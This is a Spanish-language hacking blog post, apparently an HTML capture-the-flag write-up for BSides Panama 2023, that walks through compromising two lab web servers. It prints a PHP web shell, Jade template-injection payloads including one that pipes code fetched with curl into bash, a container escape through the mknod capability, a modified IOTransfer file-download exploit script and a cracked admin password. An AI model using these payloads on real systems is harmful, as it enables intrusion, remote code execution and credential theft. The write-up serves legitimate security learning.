<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Bsides Panama 2023</title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Bsides Panama 2023" />
<meta name="author" content="FmF" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="http://localhost:4000/bsides-panama-2023.html" />
<meta property="og:url" content="http://localhost:4000/bsides-panama-2023.html" />
<meta property="og:site_name" content="FmF - Hacking blog ü©ª" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-02-01T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bsides Panama 2023" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/bsides-panama-2023.html"},"author":{"@type":"Person","name":"FmF"},"@type":"BlogPosting","url":"http://localhost:4000/bsides-panama-2023.html","headline":"Bsides Panama 2023","dateModified":"2023-02-01T00:00:00-06:00","datePublished":"2023-02-01T00:00:00-06:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FmF - Hacking blog ü©ª" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
</head><body a="dark">
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">../</a><article>
  <p class="post-meta">
    <time datetime="2023-02-01 00:00:00 -0600">2023-02-01</time>
  </p>
  
  <h1>Bsides Panama 2023</h1>

  <p><img src="/assets/img/bsides-panama-2023/banner.png" width="600" /></p>

<p>Quiero dar un agradecimiento especial para <code class="language-plaintext highlighter-rouge">Tiz</code> &lt;3 sin √©l este writeup no hubiera sido posible, dejo por aqu√≠ sus redes sociales.</p>

<ul>
  <li><a href="https://twitter.com/cap_tiz">Twitter</a></li>
  <li><a href="https://www.linkedin.com/in/john-a-kent">Linkedin</a></li>
</ul>

<h1 id="retos">Retos:</h1>

<ul>
  <li><a href="#archivo-de-respaldo-webserver">Archivo de respaldo (WebServer)</a></li>
  <li><a href="#acceso-usuario-webserver">Acceso usuario (WebServer)</a></li>
  <li><a href="#acceso-administrativo-webserver-ruta-alternativa">Acceso administrativo (WebServer)</a></li>
  <li><a href="#wordpress-webserver-ruta-alternativa">Wordpress (WebServer)</a></li>
  <li><a href="#passwordtxt-webserver2">Password.txt (WebServer2)</a></li>
  <li><a href="#acceso-usuario-webserver2">Acceso usuario (WebServer2)</a></li>
  <li><a href="#acceso-administrativo-webserver2">Acceso administrativo (WebServer2)</a></li>
  <li><a href="#plataforma-web-webserver2-ruta-alternativa">Plataforma WEB (WebServer2)</a></li>
</ul>

<h1 id="topolog√≠a-de-red">Topolog√≠a de red:</h1>

<p><img src="/assets/img/bsides-panama-2023/1.png" width="600" /></p>

<h1 id="archivo-de-respaldo-webserver">Archivo de respaldo (WebServer):</h1>

<p>Iniciamos el CTF, nos dan √∫nicamente la VPN, as√≠ que nos toca enumerar la red en busca de targets, pero si nos fijamos en nuestra direcci√≥n IP la m√°scara de red es /30 por lo cual no tenemos vecinos para interactuar, pero si echamos un vistazo a los logs cuando nos conectamos con la VPN podemos ver una red diferente la cual es: 10.1.1.0 /24.</p>

<p><img src="/assets/img/bsides-panama-2023/2.png" width="600" /></p>

<p>Teniendo esta red podemos empezar a buscar hosts con el siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sP 10.1.1.1-255
</code></pre></div></div>

<ul>
  <li><a>-sp</a> ‚Äì&gt; Habilita la funci√≥n de pingsweep.</li>
</ul>

<p>Podemos notar que encontr√≥ un host.</p>

<p><img src="/assets/img/bsides-panama-2023/3.png" width="600" /></p>

<p>Manos a la obra, vamos a realizar un escaneo m√°s profundo con el siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.1.1.100 -oN target
</code></pre></div></div>

<p>Nos encontr√≥ los siguientes puertos:</p>

<p><img src="/assets/img/bsides-panama-2023/4.png" width="600" /></p>

<p>Empezamos enumerando los puertos del servicio Web.</p>

<p>Utilizando el comando <a>whatweb</a> podemos ver que estamos ante un CentOS y m√°s informaci√≥n sobre la p√°gina Web.</p>

<p><img src="/assets/img/bsides-panama-2023/5.png" width="600" /></p>

<p>Investigando notamos que hay dos servicios Web en los puertos <a>80</a> y <a>65400</a>.</p>

<h1 id="servicio-web-en-el-puerto-80">Servicio Web en el puerto 80:</h1>

<p><img src="/assets/img/bsides-panama-2023/6.png" width="600" /></p>

<p>Al utilizar fuzzing contra esta p√°gina podemos encontrar un archivo <a>notes.txt</a> el cual contiene informaci√≥n que nos puede ser √∫til m√°s adelante:</p>

<p><img src="/assets/img/bsides-panama-2023/7.png" width="600" /></p>

<p>Y adem√°s encontramos una ruta <a>/wordpress</a> la cual contiene una p√°gina en WordPress.</p>

<p><img src="/assets/img/bsides-panama-2023/8.png" width="600" /></p>

<h1 id="servicio-web-en-el-puerto-65400">Servicio Web en el puerto 65400:</h1>

<p>Nos encontramos con una p√°gina normal.</p>

<p><img src="/assets/img/bsides-panama-2023/9.png" width="600" /></p>

<p>Viendo la p√°gina Web encontramos un par de credenciales en un post.</p>

<p><img src="/assets/img/bsides-panama-2023/10.png" width="600" /></p>

<p>Probamos las credenciales contra el panel de administraci√≥n y estamos dentro como admin.</p>

<p>En la interfaz administrativa podemos subir una imagen para personalizar el perfil de los usuarios, pero al no estar bien sanitizado pudimos subir un archivo php malicioso y ejecutar comandos en la m√°quina.</p>

<p>El archivo que subimos fue el siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php system($_REQUEST['cmd']); ?&gt;
</code></pre></div></div>

<p>Al abrir la imagen(<strong>que en realidad es el archivo php malicioso</strong>) y colocar <code class="language-plaintext highlighter-rouge">?cmd=whoami</code> podemos ejecutar comandos y tambi√©n ganar acceso al sistema.</p>

<p><img src="/assets/img/bsides-panama-2023/11.png" width="600" /></p>

<p>Creamos un index.html en nuestra m√°quina de atacante para hacer la reverse shell.</p>

<p><img src="/assets/img/bsides-panama-2023/12.png" width="600" /></p>

<p>Despu√©s compartimos el index.html con python3 y nos ponemos en escucha con <a>netcat</a>:</p>

<p><img src="/assets/img/bsides-panama-2023/13.png" width="600" /></p>

<p>Ahora para obtener la reverse shell nos falta hacer lo siguiente:</p>

<p><img src="/assets/img/bsides-panama-2023/14.png" width="600" /></p>

<p>Estamos dentro como <code class="language-plaintext highlighter-rouge">www-data</code>, hacemos tratamiento de la TTY y listo.</p>

<p><img src="/assets/img/bsides-panama-2023/15.png" width="600" /></p>

<p>Enumeramos el sistema y con <a>ss -nat</a> nos damos cuenta de que hay un puerto que no pod√≠amos ver desde el exterior, el cual es 8080, si nos recordamos antes nos dieron una pista de este puerto, la cual se encontraba en <a>notes.txt</a>.</p>

<p><img src="/assets/img/bsides-panama-2023/16.png" width="600" /></p>

<p>Realizamos un t√∫nel con <a>chisel</a> para tener acceso a ese puerto desde nuestra m√°quina.</p>

<p>En nuestra m√°quina lo ponemos as√≠: (<strong>Servidor</strong>)</p>

<p><img src="/assets/img/bsides-panama-2023/17.png" width="600" /></p>

<p>En la sesi√≥n de www-data lo ponemos de la siguiente manera: (<strong>Cliente</strong>)</p>

<p><img src="/assets/img/bsides-panama-2023/18.png" width="600" /></p>

<p>Ahora nos dirigimos a nuestro navegador y podemos colocar <a>127.0.0.1:8080</a> y nos aparecer√° el servicio que vimos en <a>notes.txt</a>.</p>

<p><img src="/assets/img/bsides-panama-2023/19.png" width="600" /></p>

<p>Si le ponemos el argumento <a>/?q=</a> y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un <a>7*7</a> el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS):</p>

<p><a>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p>

<p><img src="/assets/img/bsides-panama-2023/20.png" width="600" /></p>

<p>Para probarlo m√°s podemos utilizar el siguiente payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
</code></pre></div></div>

<p>Y en efecto nos devuelve el <a>/etc/passwd</a>, pero no de la m√°quina en la cual tenemos acceso con <strong>www-data</strong> es otra m√°quina, investigando un poco m√°s nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{root.process.mainModule.require('child_process').spawnSync('cat', ['/root/backup.sql']).stdout}
</code></pre></div></div>

<p><img src="/assets/img/bsides-panama-2023/21.png" width="600" /></p>

<p>Obtenemos la flag y un usuario y contrase√±a la cual son:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:3b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1

Decodificamos el sha256 y obtenemos lo siguiente:

admin:R@scal
</code></pre></div></div>

<h1 id="acceso-usuario-webserver">Acceso usuario (WebServer):</h1>

<p>Podemos utilizar estas credenciales para entrar al servidor por ssh.</p>

<p><img src="/assets/img/bsides-panama-2023/22.png" width="600" /></p>

<p>Adem√°s podemos ver la flag:</p>

<p><img src="/assets/img/bsides-panama-2023/23.png" width="600" /></p>

<h1 id="acceso-administrativo-webserver-ruta-alternativa">Acceso administrativo (WebServer): (ruta alternativa)</h1>

<p>Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{root.process.mainModule.require('child_process').exec('curl 172.16.80.42|bash')}
</code></pre></div></div>

<p>Tenemos que tener todo <strong>exactamente igual</strong> que cuando ganamos acceso con al WebShell.</p>

<p>Hacemos el tratamiento de la TTY y listo.</p>

<p><img src="/assets/img/bsides-panama-2023/24.png" width="600" /></p>

<p>Estamos como root y en la direcci√≥n IP <a>172.17.0.2</a></p>

<p>Enumeramos el contenedor y encontramos que podemos utilizar la siguiente informaci√≥n para leer archivos del sistema como usuario privilegiado:</p>

<p><a>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod</a></p>

<p><a>https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames</a> (La parte de escalada de privilegios)</p>

<p>Podemos explotar la capabilitie mknod del contenedor:</p>

<p>En el contenedor ejecutamos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /
mknod sda b 8 0
chmod 777 sda
echo "admin:x:1000:1000:admin,,,:/home/admin:/bin/bash" &gt;&gt; /etc/passwd
su admin --&gt; Ejecutando este comando deber√≠amos pasar al usuario node
/bin/bash
</code></pre></div></div>

<p><img src="/assets/img/bsides-panama-2023/25.png" width="600" /></p>

<p>En la m√°quina v√≠ctima como usuario admin ejecutamos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps -auxf | grep /bin/bash --&gt; Para saber cu√°l es el PID.
</code></pre></div></div>

<p><img src="/assets/img/bsides-panama-2023/26.png" width="600" /></p>

<p>Ahora que tenemos el PID en este caso <a>2676</a> nos falta obtener la flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -a "root -" /proc/2676/root/sda --&gt; Nos da un error al rato de ejecutarlo y para evitarlo utilizamos lo este otro comando:

strings /proc/2676/root/sda | grep -a "root -"
</code></pre></div></div>

<p>Obtenemos la flag:</p>

<p><img src="/assets/img/bsides-panama-2023/27.png" width="600" /></p>

<h1 id="wordpress-webserver-ruta-alternativa">WordPress (WebServer): (ruta alternativa)</h1>

<p>Hay m√∫ltiples maneras de obtener esta flag, pero se me hizo muy f√°cil de esta manera:</p>

<p>Tenemos acceso como root a mysql sin proporcionar contrase√±a:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -uroot -p --&gt; Cuando nos pide un password presionamos enter.

show databases; 

use wordpress;

select * from wp_posts where post_status='trash'; --&gt; Podemos ver posts que han sido borrados.
</code></pre></div></div>

<p>En WordPress, la papelera se gestiona en la base de datos de WordPress, espec√≠ficamente en la tabla <a>wp_posts</a>, cuando se elimina una publicaci√≥n, su estado se cambia a papelera en la columna <a>post_status</a> de la <a>tabla wp_posts</a>, y permanece all√≠ hasta que se elimine permanentemente o se restaure. La tabla wp_posts tambi√©n contiene columnas para el t√≠tulo, el contenido, el autor y otra informaci√≥n meta de la publicaci√≥n.</p>

<p>Podemos ver la flag:</p>

<p><img src="/assets/img/bsides-panama-2023/28.png" width="600" /></p>

<h1 id="passwordtxt-webserver2">Password.txt (WebServer2)</h1>

<p>Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no pod√≠amos descubrirlo atrev√©s de ping, pero si pudimos encontrarlo gracias a los puertos.</p>

<p>Ahora que sabemos que direcci√≥n IP tiene podemos hacer un escaneo m√°s profundo con <a>nmap</a> y podemos encontrar los siguientes puertos:</p>

<p><img src="/assets/img/bsides-panama-2023/29.png" width="600" /></p>

<p>Empezamos enumerando el puerto <strong>8080</strong>, y aplicamos fuzzing con el siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.1.1.150:8080/FUZZ
</code></pre></div></div>

<p>Despu√©s de esperar un buen rato podemos ver este directorio datos.</p>

<p><img src="/assets/img/bsides-panama-2023/30.png" width="600" /></p>

<p>Esto es lo que contiene el directorio:</p>

<p><img src="/assets/img/bsides-panama-2023/31.png" width="600" /></p>

<p>Buscamos en internet ‚Äú<a>iotransfer windows exploit</a>‚Äù nos topamos con este art√≠culo:</p>

<p><a>https://www.exploit-db.com/exploits/50974</a></p>

<p>Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el c√≥digo, en mi caso no sirvi√≥ por un problema de incompatibilidad con la librer√≠a win32com, as√≠ que revisando el c√≥digo podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aqu√≠ esta el c√≥digo: (<code class="language-plaintext highlighter-rouge">Funcional en Linux</code>)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/python3

import requests, json

remoteDownloadPath = r'C:\Users\frank\Desktop\password.txt'
IP = ""
localDownloadPath ="./password.txt"

def CreateDownloadTask(IP, Path) -&gt; str:
    url = f'http://{IP}:7193/index.php?action=createtask'
    task = {
        'method': 'get',
        'version': '1',
        'userid': '*',
        'taskstate': '0',
        'filepath': Path
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task['content'])
    taskid = task['taskid']
    print(f"TaskID: {taskid}")
    return taskid

def ExploitDownload(IP, DownloadPath, ID=None):
    if ID:
        url = f'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}'
    else:
        taskid = CreateDownloadTask(IP, DownloadPath)
        url = f'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}'
    res = requests.get(url)
    return 

if __name__ == '__main__':
        print(f"[*] Downloading the file: {remoteDownloadPath}")
        res = ExploitDownload(IP, remoteDownloadPath)
        file = open(localDownloadPath, "wb+")
        file.write(res.content)
        file.close()
</code></pre></div></div>

<p>Lo ejecutamos y obtenemos lo siguiente:</p>

<p><img src="/assets/img/bsides-panama-2023/32.png" width="600" /></p>

<h1 id="acceso-usuario-webserver2">Acceso usuario (WebServer2):</h1>

<p>Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(<strong>10.1.1.100</strong>) y webserver2(<strong>10.1.1.150</strong>).</p>

<p><code class="language-plaintext highlighter-rouge">ssh admin@10.1.1.100 -L 3389:10.1.1.150:3389</code></p>

<p>Para conectarnos podemos utilizar: <a>xfreerdp</a> o <a>remmina</a>.</p>

<p>En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 despu√©s de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio.</p>

<h1 id="acceso-administrativo-webserver2">Acceso administrativo (WebServer2):</h1>

<p>Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(<code class="language-plaintext highlighter-rouge">Est√° corriendo los servicios Web en los puertos 8080 y 8081</code>), nos dirigimos al directorio <code class="language-plaintext highlighter-rouge">C:\xampp2\htdocs\</code> y subimos una reverse shell para despu√©s ejecutarla desde la p√°gina web y si vemos quien la esta ejecutando es <code class="language-plaintext highlighter-rouge">WEBSERVER\Administrator</code> as√≠ que ya podemos buscar la flag del administrador.</p>

<h1 id="plataforma-web-webserver2-ruta-alternativa">Plataforma WEB (WebServer2) (ruta alternativa):</h1>

<p>Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos.</p>

<p>Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprend√≠ muchas cosas.</p>


</article>
      </div>
    </main>
  </body>
</html>